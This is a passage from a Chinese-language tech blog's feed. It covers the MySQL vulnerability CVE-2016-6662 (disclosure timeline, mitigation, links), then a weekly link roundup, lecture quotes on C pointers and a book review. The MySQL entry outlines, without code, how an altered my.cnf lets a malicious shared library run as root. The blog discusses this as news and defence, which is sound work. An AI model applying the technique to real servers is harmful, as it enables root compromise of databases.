而且是以 root 的身份執行，&lt;br /&gt;
因為是由 &lt;code&gt;mysqld_safe&lt;/code&gt; load 進來的。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img alt="Status of CVE 2016-2662" src="/files/cve-2016-2662/3.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;今年 7 月 29 日通報 Oracle、MariaDB、PerconaDB。&lt;br /&gt;
後兩者已於今年 8 月 30 日修補漏洞，新的版本中不會有此漏洞。（所以我說 Oracle 呢？）  &lt;/p&gt;
&lt;p&gt;目前仍然沒有官方補丁可用。&lt;br /&gt;
一旦有補丁釋出，使用者應該儘快更新。  &lt;/p&gt;
&lt;p&gt;暫時的解法是確認 &lt;code&gt;mysql&lt;/code&gt; 這個 user 沒有任何 MySQL 的設定檔的 owner 權限，&lt;br /&gt;
然後建立一個只有 &lt;code&gt;root&lt;/code&gt; 有 owner 權限的 &lt;code&gt;my.cnf&lt;/code&gt; 的備份檔，&lt;br /&gt;
這部份應該就是在 &lt;code&gt;my.cnf&lt;/code&gt; 真的被改掉的話，可以回復回來。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;a href="https://thehackernews.com/2016/09/hack-mysql-database.html"&gt;似乎還有一個 0-day CVE-2016-2663 不過好像還沒公佈細節&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;覺得整個攻擊的手法挺有趣的，&lt;br /&gt;
概念不難理解，&lt;br /&gt;
但可行性因為必須先注入惡意的 shared library 還要把 &lt;code&gt;my.cnf&lt;/code&gt; 的 &lt;code&gt;lib&lt;/code&gt; 路徑改掉，&lt;br /&gt;
然後還要重新啟動才會生效而大大降低，&lt;br /&gt;
反而平常沒在更新就不需要重啟的 MySQL server 不會出事。&lt;br /&gt;
但可行性低不代表不會發生，&lt;br /&gt;
個人覺得可能會出現在 APT 那種針對性的攻擊吧。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;丟在 gist 上備份一下 &lt;a href="https://gist.github.com/M157q/a3c14b99905f3d3704b2477fb47cd33a"&gt;https://gist.github.com/M157q/a3c14b99905f3d3704b2477fb47cd33a&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html"&gt;http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2016/09/13/6832/mysql-%E5%85%A8%E7%B3%BB%E5%88%97%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/"&gt;MySQL 全系列的安全性漏洞 | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.percona.com/blog/2016/09/12/percona-server-critical-update-cve-2016-6662/"&gt;Percona Server Critical Update CVE-2016-6662 - Percona Database Performance Blog&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://thehackernews.com/2016/09/hack-mysql-database.html"&gt;New MySQL Zero Days — Hacking Website Databases&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Security"></category><category term="MySQL"></category><category term="CVE"></category><category term="0day"></category><category term="Remote Code Execution"></category></entry><entry><title>Y2016W37</title><link href="https://blog.m157q.tw/posts/2016/09/18/y2016w37/" rel="alternate"></link><published>2016-09-18T23:44:38+08:00</published><updated>2016-09-18T23:44:38+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-09-18:posts/2016/09/18/y2016w37/</id><summary type="html">&lt;h3&gt;Coscup&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://breezymove.blogspot.tw/2016/09/coscup-2016.html"&gt;風吹草動: 觀 COSCUP 2016 有感&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;也是一篇還不錯的 COSCUP 2016 的心得文，我覺得值得思考一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Devops&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://devopstw.github.io/fb_post_list/#!index.md"&gt;DevOps Taiwan FB 社團貼文整理&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;先收藏起來，裏面看起來滿多不錯的好文的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Django&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.weiguda.com/blog/18/"&gt;Django-Rest-Framework 教程: 快速入门 | 上海味股达信息科技有限公司&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;就是個官網 Tutorial 的翻譯 (?)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Docker&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.evanlin.com/til-docker-remote-api/"&gt;[TIL] 關於 Docker Remote API 的學習&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好奇這東西的安全性  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.s10g.tw/posts/2016/09/13/docker-jenkins-update/"&gt;Solomon's Notebook – docker 更新 jenkins&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這樣好像挺方便的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloudplatform.googleblog.com/2016/08/Stackdriver-Error-Reporting-theres-a-mobile-app-for-that.html"&gt;Google Cloud Platform Blog: Stackdriver Error Reporting: there’s a mobile app for that&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;所以看 GCP 的 Error 可以用手機開 App 直接看了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ChristosChristofidis/awesome-deep-learning"&gt;GitHub - ChristosChristofidis/awesome-deep-learning: A curated list of awesome Deep Learning tutorials, projects and communities.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一樣也是個先收藏的概念，還沒有仔細看。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/lengstrom/falcon"&gt;GitHub - lengstrom/falcon: Chrome extension for full text history search!&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;拿來找查過什麼東西好像挺方便的，不過我比較擔心的是它紀錄了哪些東西。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Javascript&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ju5td0m7m1nd/NTHU_FORCE_ENROLLMENT"&gt;GitHub - ju5td0m7m1nd/NTHU_FORCE_ENROLLMENT&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;時不時會出現的拿選課系統來練功的同學？這次是清大的 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Machine learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@vzkuma/4-steps-for-learning-deep-learning-86f11fcee54#.a7k7yf5rh"&gt;4 Steps for Learning Deep Learning – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是 Deep Learning 101 吧？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://jvns.ca/blog/2016/09/12/how-i-got-a-cs-degree-without-learning-what-a-system-call-is/"&gt;How I got a CS degree without learning what a system call is - Julia Evans&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;覺得值得思考一下，畢竟資工涵蓋的太廣了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.leiphone.com/news/201609/9kQ3T4nyzFbINyDS.html"&gt;大疆工程师教你如何成为一名机器人工程师（上） | 雷锋网&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好詳細的經驗分享啊 而且還有三部曲  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Reactjs&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kdchang/reactjs101/tree/master/Ch01"&gt;reactjs101/Ch01 at master · kdchang/reactjs101 · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好像滿紅的，雖然我沒寫 ReactJS，但也是收藏一下，畢竟是臺灣人寫的，值得多多支持。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html"&gt;MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是這週也是今年最重大的資安事件吧，MySQL 全版本加上其衍生出來的 MariaDB 和 PerconaDB 全部中獎，雖然因為必須重新啟動 MySQL sever 後 exploit 才會生效大大降低了其侵略性，但還是有一定的威脅性。反而不更新不重開的系統不會中獎。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.trendmicro.com.tw/?p=15932"&gt;2015 重大資安新聞回顧 | 資安趨勢&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;因為上面那個事件，所以回顧了一下去年的重大資安事件。看來就 Adobe Flash Player 幾個 zero-day，然後比較多新聞的 Hacking Team 外洩。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ithome.com.tw/voice/93355"&gt;2014 IT大事回顧 | iThome&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;上半年就 OpenSSH 的 HeartBleed，下半年就 Bash 的 ShellShock。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/photo.php?fbid=10207281283730583&amp;amp;set=gm.1068839919859080&amp;amp;type=3&amp;amp;theater"&gt;柯維然 - 大家好，我目前服務於新竹市警察局&lt;br /&gt;
常聽到很多民眾詢問&lt;br /&gt;
我要怎麼申請？派出所在哪裡？罰單怎麼繳？... | Facebook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;柯官又有新作品了，用 Line API 開發了一個給民眾的 Q&amp;amp;A 機器人。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Tech&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://techfeed.today/2016/09/06/%E9%9B%99%E9%8F%A1%E9%A0%AD%E6%8A%80%E8%A1%93%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90/"&gt;雙鏡頭技術深入剖析 - TechFeed科技讀報&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;感覺好像一堆電腦視覺課的內容都可以玩了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://gushi.tw/archives/34451"&gt;那些年，我們說的契丹話&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來跳躍、角色等等詞會有破音字的讀法是因為這樣嗎？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Vim&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2016/09/13/6833/vim-8-0/"&gt;Vim 8.0... | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;竟然有 Packages 了？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://linuxtoy.org/archives/vim-80-released.html"&gt;Vim 8.0 发布 · LinuxTOY&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是 release note 的中文翻譯版？底下留言也有提到有人已經轉去用 neovim 很久了，身邊也有認識的改用 neovim 哩，但我自己是還在用 Vim 就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.brucefeng.info/post/high-qps-service"&gt;当服务QPS增高时我们做什么&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;寫的沒有很多，但我覺得都有點到重點，剛好在公司的工作內容也有碰到這部份。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Machine learning"></category><category term="Programming"></category><category term="Tech"></category><category term="Docker"></category><category term="Gcp"></category><category term="Vim"></category><category term="Javascript"></category><category term="Coscup"></category><category term="Reactjs"></category><category term="Security"></category><category term="Web"></category><category term="Github"></category><category term="Taiwan"></category><category term="Devops"></category><category term="Trivia"></category><category term="Django"></category></entry><entry><title>20160918 - 你所不知道的 C 語言：指標篇 復刻！</title><link href="https://blog.m157q.tw/posts/2016/09/18/guts-c-pointers/" rel="alternate"></link><published>2016-09-20T01:17:00+08:00</published><updated>2016-09-20T01:17:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-09-18:posts/2016/09/18/guts-c-pointers/</id><summary type="html">&lt;p&gt;這篇嚴格來說不算筆記，&lt;br /&gt;
大概只算 jserv 語錄 （？）&lt;br /&gt;
想真的瞭解內容的話還是得看共筆就是。  &lt;/p&gt;
&lt;p&gt;從晚上九點才開始聽，&lt;br /&gt;
而且一開始在是剛到臺北下統聯後，&lt;br /&gt;
在要回租屋處的捷運上邊搭邊聽的，&lt;br /&gt;
所以其實無法太詳細紀錄。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;影片：&lt;a href="https://www.youtube.com/watch?v=Eiu2Le-xjmg"&gt;https://www.youtube.com/watch?v=Eiu2Le-xjmg&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;共筆：&lt;a href="http://hackfoldr.org/dykc/s0rlzR8wVtm"&gt;http://hackfoldr.org/dykc/s0rlzR8wVtm&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;聊天室：&lt;a href="https://gitter.im/embedded2015/guts-general"&gt;https://gitter.im/embedded2015/guts-general&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Note&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;「我去天瓏書店翻書的時候，看到有些書提到『雙指標』，但其實根本沒有雙指標這種東西，只有『指標的指標』，這兩個是完全不同的東西，就像『雙馬尾』跟『馬尾的馬尾』是完全不同的東西，所以拜託看到有『雙指標』的 C 語言的書就不要買了。」  &lt;/li&gt;
&lt;li&gt;「要看懂 C 語言的規格書，你得先會微積分。所以微積分很重要的，趕快去複習一下。」(註：Function Designator 的部份)  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// 這句應該是指 function designator 的這種狀況  &lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;  
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;********&lt;/span&gt;&lt;span class="n"&gt;puts&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Hello&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  

&lt;span class="c1"&gt;// 不管有幾個 * 結果都一樣  &lt;/span&gt;
&lt;span class="c1"&gt;// 就像 e^x 對 x 微分不管微幾次結果都是 e^x  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;「Function Designator 的 Designator 不要唸成跟 Design 一樣，它的 i 是短音的。」  &lt;ul&gt;
&lt;li&gt;附上音標  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ zdict designator  
designator  
KK&lt;span class="o"&gt;[&lt;/span&gt;͵dɛzɪgˋnetɚ&lt;span class="o"&gt;]&lt;/span&gt; DJ&lt;span class="o"&gt;[&lt;/span&gt;͵dezigˋneitə&lt;span class="o"&gt;]&lt;/span&gt;  
n.名詞  
  &lt;span class="m"&gt;1&lt;/span&gt;. 指示者；指定者  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;「lvalue 和 rvalue 是很複雜的東西，不是只有在等號左邊或等號右邊的意思，今天時間不夠，所以我不想跟你講。」  &lt;/li&gt;
&lt;li&gt;「很多人都以為字串很簡單，但不對，自從 C99 以後，字串非常複雜。」  &lt;/li&gt;
&lt;li&gt;「世界上有個很神奇的 Compiler 叫作 Microsoft C compiler，他不支援直接使用 UTF-8。」  &lt;/li&gt;
&lt;li&gt;「C 的 Array 只是 Pointer 的 syntax sugar，但寫法並不是所有情況都可以互換，只有當作 function definition 的 parameter 時可以互換。如果是 extern 的時候換成 pointer 方式的寫法的話，產生出來的組合語言是完全不一樣的，這件事說來慚愧，我是寫了程式 10 年以後才知道的，是某次在處理 JVM 的程式碼的時候發現的。」  &lt;/li&gt;
&lt;li&gt;「C 其實沒有 Array 這個東西，真正的名字是 Array Subscripting，它只是一種 pointer 的表示法。」  &lt;/li&gt;
&lt;li&gt;「你之所以看不懂 Linux Kernel，往往不是因為 Linux Kernel 很複雜，而是你不懂 C 語言。」  &lt;/li&gt;
&lt;li&gt;「在 C99，有個很麻煩的東西叫 lvalue，l 不是 left，不是在等號左邊的意思，而是 object locator, l 是 locator 的意思。然後這在 C++ 裏面又被重新定義了，這又是另外一回事了。」  &lt;/li&gt;
&lt;li&gt;「C 從 1972 被發明出來開始是沒有 float 的，只有 double，float 在 1985 的 IEEE754 制定時才出現，然後在 1989 年才確定。」  &lt;/li&gt;
&lt;li&gt;「C 和 C++ 在 1999 年以後就兵分兩路了，雖然他們還是有共同的地方，但請把他們兩個當作不同的語言來學。」  &lt;/li&gt;
&lt;li&gt;「如果你貿然得想從 Linux Kernel 去學習作業系統和 C 語言的話，往往會吃很大的虧，因為 Linux Kernel 用到了很多 C 語言的東西，而且還用到了不少 Undefined Behavior。」  &lt;/li&gt;
&lt;li&gt;和作業系統相關概念的共筆：&lt;a href="http://hackfoldr.org/oscar"&gt;http://hackfoldr.org/oscar&lt;/a&gt;。  &lt;/li&gt;
&lt;li&gt;歡迎訂閱這個粉絲專頁 &lt;a href="https://www.facebook.com/JservFans/"&gt;https://www.facebook.com/JservFans/&lt;/a&gt; 會不時的分享一些和 Open Source 有關的消息。  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="C"></category><category term="GUTS"></category><category term="jserv"></category><category term="pointers"></category></entry><entry><title>《改變世界的九大演算法》</title><link href="https://blog.m157q.tw/posts/2016/09/18/9-algorithms-that-changed-the-future/" rel="alternate"></link><published>2016-09-19T22:38:00+08:00</published><updated>2016-09-19T22:38:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-09-18:posts/2016/09/18/9-algorithms-that-changed-the-future/</id><summary type="html">&lt;p&gt;&lt;img alt="front cover" src="/files/9-algorithms-that-changed-the-future/front-cover.jpg" /&gt;&lt;br /&gt;
&lt;img alt="back cover" src="/files/9-algorithms-that-changed-the-future/back-cover.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;這本書在 5 月多的時候逛信義誠品的時候就有看到了，&lt;br /&gt;
當時稍微翻了一下，&lt;br /&gt;
覺得寫還不錯，&lt;br /&gt;
但因為已經有買其他的書了，&lt;br /&gt;
而且覺得書的性質比較偏向科普，&lt;br /&gt;
內容應該都知道，&lt;br /&gt;
所以當時沒買。&lt;br /&gt;
然後今年 COSCUP 2016 的時候在天瓏的攤位又看到這本，&lt;br /&gt;
就買來看了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Note &amp;amp; Thought&lt;/h2&gt;
&lt;p&gt;裏面所講的九大演算法就是在封底有提到的：&lt;br /&gt;
（其實我覺得不應該說演算法， 應該說是資訊技術好像比較恰當。）  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Search Engine Indexing  &lt;/li&gt;
&lt;li&gt;Page Rank  &lt;ul&gt;
&lt;li&gt;促成 Google 崛起的那篇論文的一些基本概念。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Public-key Cryptography  &lt;ul&gt;
&lt;li&gt;講些對稱加密和非對稱加密的基礎概念，還有當然一定會提到一下 RSA，沒有細講。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Error-correcting Codes  &lt;ul&gt;
&lt;li&gt;Error Detection 和 Error Correction 都有提到，我印象中沒有提到 Grey code，然後 Hamming Code 只有帶過而已，但基本上就是講 Hamming Code 的概念。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pattern Recognition  &lt;ul&gt;
&lt;li&gt;人工智慧的部份，一定會提到的 NIST 的手寫辨識等等。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data Compression  &lt;ul&gt;
&lt;li&gt;壓縮的技術，這部份個人覺得是計概書和大學課程比較少著墨的部份。簡單講解了一些基本的資料壓縮的概念。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Databases  &lt;ul&gt;
&lt;li&gt;一定會提到的關聯式資料庫之父： &lt;a href="https://en.wikipedia.org/wiki/Edgar_F._Codd"&gt;Edgar F. Codd&lt;/a&gt;。提到了 Relational Algebra，然後再以 SQL 作為例子講一下儲存在資料庫裡的範例，對於 NoSQL 就沒有提及了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Digital Signature  &lt;ul&gt;
&lt;li&gt;這部份跟講加密的那個章節有些關聯，也是本書裏面章節篇幅比較長的部份，花了滿多時間在試圖簡化整個數位簽章的概念，讓讀者可以更好理解。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如果存在的話將會很了不起的演算法  &lt;ul&gt;
&lt;li&gt;其實我沒有很明白作者這裡指的是什麼，第十一章的結論中有一節提到「頗具潛力的演算法」，提到以下幾種：  &lt;ul&gt;
&lt;li&gt;新的但還未出現的跟 Pattern Recoginization 有關的演算法  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Zero-knowledge_proof"&gt;Zero-knowledge Protocol&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;和資訊安全有關，不知道是不是因為比較新，所以在修密碼學和資安概論的時候都沒看過這東西。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Distributed Hash Table  &lt;/li&gt;
&lt;li&gt;Byzantine fault tolerance （拜占庭容錯）  &lt;ul&gt;
&lt;li&gt;看來跟之前在 COSCUP 2016 的 Docker Workshop 學到的&lt;a href="https://zh.wikipedia.org/zh-tw/%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%B0%86%E5%86%9B%E9%97%AE%E9%A2%98"&gt;拜占庭將軍問題&lt;/a&gt;是一樣的東西，在講 Distributed Computing 中，點對點通訊時如何處理錯誤的訊息。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;作者也有在前言裡頭講到，&lt;br /&gt;
他挑的這些都已經是目前普通人天天都會用到的東西了，&lt;br /&gt;
所以這本書並不適合對演算法已經有一定程度瞭解的人閱讀，&lt;br /&gt;
因為不是想像中的去比較各個領域中演算法的優缺點。）  &lt;/p&gt;
&lt;p&gt;裏面印象比較深刻的就是第四章講非對稱加密的部份，&lt;br /&gt;
用了混合油漆的例子來比喻 Diffie-Hellman Key exchange 及非對稱加密的過程。&lt;br /&gt;
這裡有&lt;a href="https://www.youtube.com/watch?v=YEBfamv-_do"&gt;一部影片&lt;/a&gt;跟&lt;a href="https://mobile.twitter.com/JZdziarski/status/753640015108841472"&gt;一則 tweet&lt;/a&gt; 作為詮釋。&lt;br /&gt;
要是我當年修密碼學的時候可以早點知道這樣的解釋也許會學的比較好吧？  &lt;/p&gt;
&lt;p&gt;之前修密碼學的時候，&lt;br /&gt;
剛碰到這部份也是有點一頭霧水。&lt;br /&gt;
尤其是一開始的部份沒理解清楚的話，&lt;br /&gt;
到之後的 X.509 憑證交換的部份又會更難理解。  &lt;/p&gt;
&lt;p&gt;這邊又想到之前看到&lt;a href="https://twitter.com/JZdziarski/status/753223642297892864"&gt;一則 tweet&lt;/a&gt; 用 emoji 來講 Public Key Infrastructure，也是很簡單易懂。&lt;br /&gt;
因為覺得很重要，所以截個圖好了。&lt;br /&gt;
&lt;img alt="Explain PKI in emoji way" src="/files/9-algorithms-that-changed-the-future/pki-emoji.png" /&gt;  &lt;/p&gt;
&lt;p&gt;這本書本來就定位為科普書籍，&lt;br /&gt;
所以作者儘量以非常簡單的例子來比喻，&lt;br /&gt;
我覺得這是本書值得看的部份。  &lt;/p&gt;
&lt;p&gt;適合對資訊技術有興趣但沒有相關基礎的大眾閱讀，&lt;br /&gt;
我不會說他很平易近人，&lt;br /&gt;
即便作者已經用很簡單且省去很多細節的方式描述，&lt;br /&gt;
但畢竟描述的都是一些有重大影響力的論文或是概念，&lt;br /&gt;
所以還是會需要些時間來瞭解。&lt;br /&gt;
但真的已經比普通大學資工課程裡所學的內容還易懂，&lt;br /&gt;
個人覺得挺適合高中畢業已經考上大學資工系的學生當成簡單的計概書來唸唸。  &lt;/p&gt;
&lt;p&gt;以我這個修完大學資工系課程的學生來說，&lt;br /&gt;
大部分的內容都是我已經知道的基本概念，&lt;br /&gt;
但還是有學到我不曾聽過的東西，&lt;br /&gt;
像是：Zero-knowledge protocol，&lt;br /&gt;
而且書中有些比喻真的是修課的時候沒有理解到的。  &lt;/p&gt;
&lt;p&gt;這本書是 2012 年出版的，&lt;br /&gt;
比較有印象的是在第十章探討電腦能夠解決哪些問題的極限時，&lt;br /&gt;
還把電腦無法像人一樣駕駛汽車列了出來，&lt;br /&gt;
但在今年，自動駕駛已經不是什麼稀奇的事了，&lt;br /&gt;
真的感受到科技變革的快速。  &lt;/p&gt;
&lt;p&gt;個人覺得這本書比較可惜的部份是對網際網路這塊沒提到，&lt;br /&gt;
例如網路的通訊原理、TCP/IP、ARPA Net、World Wide Web 的出現等等。&lt;br /&gt;
然後可能是因為譯者不是資工相關領域的，&lt;br /&gt;
所以有些跟資工領域相關的翻譯我自己覺得是有點怪怪的，&lt;br /&gt;
沒那麼到位的感覺。  &lt;/p&gt;
&lt;p&gt;總體而言我還是覺得這本書可以看一下，&lt;br /&gt;
但對於資工領域相關知識和歷史已經有一定程度瞭解的人來說，&lt;br /&gt;
我就不建議閱讀這本書了，&lt;br /&gt;
因為看了一定會覺得這本書省略了太多的細節 XD&lt;br /&gt;
（比如說在提到某個演算法的時候沒有提到作者、&lt;br /&gt;
提到著名的 &lt;a href="https://en.wikipedia.org/wiki/Dartmouth_Conferences"&gt;1956 Dartmouth Conference&lt;/a&gt; 的時候，&lt;br /&gt;
沒有提到 Marvin Minsky, John McCarthy，&lt;br /&gt;
只有說 Claude Shannon 有參與）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/9_Algorithms_that_Changed_the_Future"&gt;9 Algorithms that Changed the Future - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Zero-knowledge_proof"&gt;Zero-knowledge Protocol&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%B0%86%E5%86%9B%E9%97%AE%E9%A2%98"&gt;拜占庭將軍問題&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=YEBfamv-_do"&gt;Public key cryptography - Diffie-Hellman Key Exchange (full version) - YouTube&lt;/a&gt;  &lt;/li&gt;
